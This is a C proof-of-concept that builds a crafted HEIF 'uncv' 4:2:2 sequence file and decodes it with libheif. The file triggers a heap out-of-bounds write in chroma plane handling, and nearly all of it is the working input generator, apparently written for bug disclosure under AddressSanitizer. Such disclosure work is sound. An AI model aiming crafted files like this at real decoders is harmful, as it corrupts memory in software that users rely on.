/*
 * PoC: heap out-of-bounds access while decoding an uncompressed ('uncv')
 * 4:2:2 image sequence frame.
 *
 * The sequence decoder derives the Cb/Cr plane geometry of a frame from
 * the luma plane geometry. For 4:2:2 chroma the planes are only
 * subsampled horizontally, so the chroma planes must be as tall as the
 * luma plane; when the decoder halves the plane height as well, the
 * frame decode writes the lower half of the chroma samples past the end
 * of the chroma plane buffers.
 *
 * The input file is a minimal, structurally valid HEIF sequence with one
 * 'uncv' track (a single 128x130 YCbCr 4:2:2 frame); it is built here
 * with the same box layout the library's own writer produces, and decoded
 * through the public sequence decoding API (heif_context_read_from_memory
 * + heif_track_decode_next_image).
 *
 * Build (from the repository root, against an ASan build of the library):
 *   clang -fsanitize=address -g -I libheif/api -I build-asan \
 *       pocs/uncv422_short_chroma.c -o /tmp/uncv422_short_chroma \
 *       build-asan/libheif/libheif.a -lstdc++ -lm -lz -lbrotlidec -lbrotlienc -lpthread
 * Run: /tmp/uncv422_short_chroma
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "libheif/heif.h"
#include "libheif/heif_sequences.h"


/* 4:2:2 frame. */
#define FRAME_WIDTH 128
#define FRAME_HEIGHT 130

/* cmpd component types (ISO/IEC 23001-17 Table 1). */
#define CMPD_Y 1
#define CMPD_CB 2
#define CMPD_CR 3

/* Sampling modes (ISO/IEC 23001-17 Table 3). */
#define SAMPLING_422 1

/* Interleave modes (ISO/IEC 23001-17 Table 4). */
#define INTERLEAVE_COMPONENT 0


/* --- minimal big-endian byte stream helpers ------------------------- */

typedef struct
{
  uint8_t* data;
  size_t size;
  size_t capacity;
} Buf;

static void buf_put(Buf* b, const void* p, size_t n)
{
  if (b->size + n > b->capacity) {
    b->capacity = (b->size + n) * 2 + 64;
    b->data = realloc(b->data, b->capacity);
    if (b->data == NULL) {
      fprintf(stderr, "out of memory\n");
      exit(1);
    }
  }
  memcpy(b->data + b->size, p, n);
  b->size += n;
}

static void buf_u16(Buf* b, uint16_t v)
{
  uint8_t p[2] = {(uint8_t)(v >> 8), (uint8_t)v};
  buf_put(b, p, 2);
}

static void buf_u32(Buf* b, uint32_t v)
{
  uint8_t p[4] = {(uint8_t)(v >> 24), (uint8_t)(v >> 16), (uint8_t)(v >> 8), (uint8_t)v};
  buf_put(b, p, 4);
}

static void buf_fourcc(Buf* b, const char* s)
{
  buf_put(b, s, 4);
}

/* Start a box: reserve the size field, write the type. */
static void box_start(Buf* b, const char* type)
{
  buf_u32(b, 0);
  buf_fourcc(b, type);
}

/* Finish the last box that was started: patch in its total size. */
static void box_end(Buf* b, size_t start_offset)
{
  size_t box_size = b->size - start_offset;
  b->data[start_offset] = (uint8_t)(box_size >> 24);
  b->data[start_offset + 1] = (uint8_t)(box_size >> 16);
  b->data[start_offset + 2] = (uint8_t)(box_size >> 8);
  b->data[start_offset + 3] = (uint8_t)box_size;
}


/* --- sample description boxes ---------------------------------------- */

static void put_cmpd(Buf* b)
{
  size_t start = b->size;
  box_start(b, "cmpd");
  buf_u32(b, 3);            /* component_count */
  buf_u16(b, CMPD_Y);
  buf_u16(b, CMPD_CB);
  buf_u16(b, CMPD_CR);
  box_end(b, start);
}

static void put_uncC(Buf* b)
{
  size_t start = b->size;
  box_start(b, "uncC");
  buf_u32(b, 0);            /* version 0, flags 0 */
  buf_u32(b, 0);            /* profile (0 for version 0) */

  /* Six components: Y, Y, Cb, Cb, Cr, Cr (each cmpd entry used twice).
   * Each entry: component_index (u16), component_bit_depth-1 (u8),
   * component_format (u8), component_align_size (u8). */
  buf_u32(b, 6);
  for (int i = 0; i < 2; i++) {
    buf_u16(b, 0);          /* component_index: Y */
    buf_put(b, "\x07", 1);  /* component_bit_depth - 1 -> 8 bit */
    buf_put(b, "\x00", 1);  /* component_format: unsigned */
    buf_put(b, "\x00", 1);  /* component_align_size: 0 */
  }
  for (int i = 0; i < 2; i++) {
    buf_u16(b, 1);          /* component_index: Cb */
    buf_put(b, "\x07\x00\x00", 3);
  }
  for (int i = 0; i < 2; i++) {
    buf_u16(b, 2);          /* component_index: Cr */
    buf_put(b, "\x07\x00\x00", 3);
  }

  buf_u16(b, (SAMPLING_422 << 8) | INTERLEAVE_COMPONENT);
  buf_put(b, "\0\0", 2);    /* block_size: 0, flags: 0 */
  buf_u32(b, 0);            /* pixel_size */
  buf_u32(b, 0);            /* row_align_size */
  buf_u32(b, 0);            /* tile_align_size */
  buf_u32(b, 0);            /* num_tile_columns - 1 */
  buf_u32(b, 0);            /* num_tile_rows - 1 */
  box_end(b, start);
}

static void put_uncv(Buf* b, uint16_t width, uint16_t height)
{
  size_t start = b->size;
  box_start(b, "uncv");
  buf_put(b, "\0\0\0\0\0\0", 6); /* SampleEntry reserved */
  buf_u16(b, 1);                 /* data_reference_index */
  buf_u16(b, 0);                 /* pre_defined */
  buf_u16(b, 0);                 /* reserved */
  buf_u32(b, 0);                 /* pre_defined2[0] */
  buf_u32(b, 0);                 /* pre_defined2[1] */
  buf_u32(b, 0);                 /* pre_defined2[2] */
  buf_u16(b, width);
  buf_u16(b, height);
  buf_u32(b, 0x00480000);        /* horizresolution: 72 dpi */
  buf_u32(b, 0x00480000);        /* vertresolution: 72 dpi */
  buf_u32(b, 0);                 /* reserved */
  buf_u16(b, 1);                 /* frame_count */
  for (int i = 0; i < 32; i++) { /* compressorname (fixed 32 bytes) */
    buf_put(b, "\0", 1);
  }
  buf_u16(b, 0x0018);            /* depth */
  buf_u16(b, 0xFFFF);            /* pre_defined */

  put_cmpd(b);
  put_uncC(b);
  box_end(b, start);
}


/* --- sequence file --------------------------------------------------- */

/* Size of the one sample in the track: component-interleaved data for the
 * six uncC components (Y, Y, Cb, Cb, Cr, Cr) of a single tile. With 4:2:2
 * sampling the chroma components have half the width but the full height. */
static size_t sample_size(void)
{
  size_t luma = (size_t)FRAME_WIDTH * FRAME_HEIGHT;
  size_t chroma = (size_t)(FRAME_WIDTH / 2) * FRAME_HEIGHT;
  return 2 * luma + 4 * chroma;
}

static void build_sequence_file(Buf* file)
{
  Buf b = {0};

  /* --- ftyp */
  size_t ftyp = b.size;
  box_start(&b, "ftyp");
  buf_fourcc(&b, "msf1");
  buf_u32(&b, 0);
  buf_fourcc(&b, "msf1");
  buf_fourcc(&b, "isom");
  box_end(&b, ftyp);

  /* --- moov > mvhd (version 0) */
  size_t moov = b.size;
  box_start(&b, "moov");

  size_t mvhd = b.size;
  box_start(&b, "mvhd");
  buf_u32(&b, 0);            /* version 0, flags 0 */
  buf_u32(&b, 0);            /* creation_time */
  buf_u32(&b, 0);            /* modification_time */
  buf_u32(&b, 1000);         /* timescale */
  buf_u32(&b, 1);            /* duration */
  buf_u32(&b, 0x00010000);   /* rate: 1.0 */
  buf_u16(&b, 0x0100);       /* volume */
  buf_u16(&b, 0);            /* reserved */
  buf_u32(&b, 0);            /* reserved */
  buf_u32(&b, 0);            /* reserved */
  for (int i = 0; i < 9; i++) buf_u32(&b, 0);  /* matrix */
  for (int i = 0; i < 6; i++) buf_u32(&b, 0);  /* pre_defined */
  buf_u32(&b, 2);            /* next_track_ID */
  box_end(&b, mvhd);

  /* --- moov > trak */
  size_t trak = b.size;
  box_start(&b, "trak");

  size_t tkhd = b.size;
  box_start(&b, "tkhd");
  buf_u32(&b, 0x00000007);   /* version 0, flags: enabled|in_movie|in_preview */
  buf_u32(&b, 0);            /* creation_time */
  buf_u32(&b, 0);            /* modification_time */
  buf_u32(&b, 1);            /* track_ID */
  buf_u32(&b, 0);            /* reserved */
  buf_u32(&b, 1);            /* duration */
  buf_u32(&b, 0);            /* reserved */
  buf_u32(&b, 0);            /* reserved */
  buf_u16(&b, 0);            /* layer */
  buf_u16(&b, 0);            /* alternate_group */
  buf_u16(&b, 0);            /* volume */
  buf_u16(&b, 0);            /* reserved */
  for (int i = 0; i < 9; i++) buf_u32(&b, 0);  /* matrix */
  buf_u32(&b, FRAME_WIDTH << 16);
  buf_u32(&b, FRAME_HEIGHT << 16);
  box_end(&b, tkhd);

  /* --- trak > mdia */
  size_t mdia = b.size;
  box_start(&b, "mdia");

  size_t mdhd = b.size;
  box_start(&b, "mdhd");
  buf_u32(&b, 0);            /* version 0, flags 0 */
  buf_u32(&b, 0);            /* creation_time */
  buf_u32(&b, 0);            /* modification_time */
  buf_u32(&b, 1000);         /* timescale */
  buf_u32(&b, 1);            /* duration */
  buf_u16(&b, 0x55c4);       /* language: 'und' */
  buf_u16(&b, 0);            /* pre_defined */
  box_end(&b, mdhd);

  size_t hdlr = b.size;
  box_start(&b, "hdlr");
  buf_u32(&b, 0);            /* version 0, flags 0 */
  buf_u32(&b, 0);            /* pre_defined */
  buf_fourcc(&b, "pict");    /* handler_type: image sequence */
  buf_u32(&b, 0);            /* reserved */
  buf_u32(&b, 0);            /* reserved */
  buf_u32(&b, 0);            /* reserved */
  buf_put(&b, "\0", 1);      /* name */
  box_end(&b, hdlr);

  /* --- mdia > minf */
  size_t minf = b.size;
  box_start(&b, "minf");

  size_t vmhd = b.size;
  box_start(&b, "vmhd");
  buf_u32(&b, 0x00000001);   /* version 0, flags 1 */
  buf_u16(&b, 0);            /* graphicsmode */
  buf_u16(&b, 0);            /* opcolor[0] */
  buf_u16(&b, 0);            /* opcolor[1] */
  buf_u16(&b, 0);            /* opcolor[2] */
  box_end(&b, vmhd);

  /* --- minf > stbl */
  size_t stbl = b.size;
  box_start(&b, "stbl");

  size_t stsd = b.size;
  box_start(&b, "stsd");
  buf_u32(&b, 0);            /* version 0, flags 0 */
  buf_u32(&b, 1);            /* entry_count */
  put_uncv(&b, FRAME_WIDTH, FRAME_HEIGHT);
  box_end(&b, stsd);

  size_t stts = b.size;
  box_start(&b, "stts");
  buf_u32(&b, 0);            /* version 0, flags 0 */
  buf_u32(&b, 1);            /* entry_count */
  buf_u32(&b, 1);            /* sample_count */
  buf_u32(&b, 1);            /* sample_delta */
  box_end(&b, stts);

  size_t stsc = b.size;
  box_start(&b, "stsc");
  buf_u32(&b, 0);            /* version 0, flags 0 */
  buf_u32(&b, 1);            /* entry_count */
  buf_u32(&b, 1);            /* first_chunk */
  buf_u32(&b, 1);            /* samples_per_chunk */
  buf_u32(&b, 1);            /* sample_description_index */
  box_end(&b, stsc);

  size_t stsz = b.size;
  box_start(&b, "stsz");
  buf_u32(&b, 0);            /* version 0, flags 0 */
  buf_u32(&b, (uint32_t)sample_size()); /* fixed sample_size */
  buf_u32(&b, 1);            /* sample_count */
  box_end(&b, stsz);

  /* stco: chunk offset, patched once the mdat position is known. */
  size_t stco = b.size;
  box_start(&b, "stco");
  buf_u32(&b, 0);            /* version 0, flags 0 */
  buf_u32(&b, 1);            /* entry_count */
  size_t stco_offset_field = b.size;
  buf_u32(&b, 0);            /* chunk_offset (placeholder) */
  box_end(&b, stco);

  box_end(&b, stbl);
  box_end(&b, minf);
  box_end(&b, mdia);
  box_end(&b, trak);
  box_end(&b, moov);

  /* --- mdat with the single sample */
  size_t mdat = b.size;
  box_start(&b, "mdat");
  size_t payload = b.size;
  for (size_t i = 0; i < sample_size(); i++) {
    uint8_t v = (uint8_t)(0x40 + (i & 0x3f));
    buf_put(&b, &v, 1);
  }
  box_end(&b, mdat);

  /* Patch the chunk offset to point at the mdat payload. */
  uint32_t chunk_offset = (uint32_t)payload;
  b.data[stco_offset_field] = (uint8_t)(chunk_offset >> 24);
  b.data[stco_offset_field + 1] = (uint8_t)(chunk_offset >> 16);
  b.data[stco_offset_field + 2] = (uint8_t)(chunk_offset >> 8);
  b.data[stco_offset_field + 3] = (uint8_t)chunk_offset;

  *file = b;
}


int main(void)
{
  Buf file = {0};
  build_sequence_file(&file);
  printf("built %zu byte uncv %dx%d 4:2:2 sequence file\n",
         file.size, FRAME_WIDTH, FRAME_HEIGHT);

  heif_context* ctx = heif_context_alloc();
  heif_error err = heif_context_read_from_memory(ctx, file.data, file.size, NULL);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "read_from_memory: %s\n", err.message);
    return 1;
  }
  if (!heif_context_has_sequence(ctx)) {
    fprintf(stderr, "file does not contain a sequence\n");
    return 1;
  }

  heif_track* track = heif_context_get_track(ctx, 0);
  if (track == NULL) {
    fprintf(stderr, "no track\n");
    return 1;
  }

  heif_image* image = NULL;
  err = heif_track_decode_next_image(track, &image,
                                     heif_colorspace_RGB,
                                     heif_chroma_interleaved_24bit,
                                     NULL);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "decode_next_image: %s\n", err.message);
    return 1;
  }

  printf("decoded %dx%d RGB frame\n",
         heif_image_get_primary_width(image),
         heif_image_get_primary_height(image));

  heif_image_release(image);
  heif_track_release(track);
  heif_context_free(ctx);
  free(file.data);
  return 0;
}
